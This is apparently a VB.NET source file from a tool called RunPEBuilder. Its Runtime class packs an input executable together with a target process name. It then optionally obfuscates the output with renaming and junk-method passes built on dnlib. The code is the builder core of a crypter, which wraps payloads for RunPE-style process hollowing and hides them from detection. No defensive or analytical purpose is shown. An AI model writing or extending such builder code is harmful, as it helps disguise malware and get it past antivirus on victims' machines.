Imports dnlib.DotNet
Imports System
Imports System.IO

Namespace RunPEBuilder.Include
    Friend Class Runtime
        Public Shared Function RuntimeMain(InFile As String, OutFile As String, processName As String, obfuscate As Boolean) As String
            If New FileInfo(InFile).Length = 0 Then
                Return $"Error: Input file {InFile} is empty."
            End If
            Try
                Dim packedBytes = PckMethod.Pack(File.ReadAllBytes(InFile), processName, PckMethod.DotNetVersion.v4_0)
                If packedBytes Is Nothing Then
                    Return "Error: Packing failed."
                End If

                File.WriteAllBytes(OutFile, packedBytes)
                If obfuscate Then
                    ' Rename output file for obfuscation
                    Dim tempFile = Path.Combine(Path.GetDirectoryName(OutFile), $"sample_{Path.GetFileName(OutFile)}")
                    File.Move(OutFile, tempFile)

                    ' Load the module from the temp file without locking it
                    Using stream = New FileStream(tempFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
                        Dim [module] = ModuleDefMD.Load(stream)

                        ' Execute obfuscation
                        RenameProtector.Execute([module], tempFile)
                        JunkMethods.Execute([module], tempFile)

                        ' Ensure to write the module after closing the stream
                        [module].Write(tempFile)
                    End Using

                    ' Move back to original output file
                    File.Move(tempFile, OutFile)
                End If
                Return "File builded and obfuscated successfully!"
            Catch ex As Exception
                Return $"Error: {ex.Message}"
            End Try
        End Function
    End Class
End Namespace
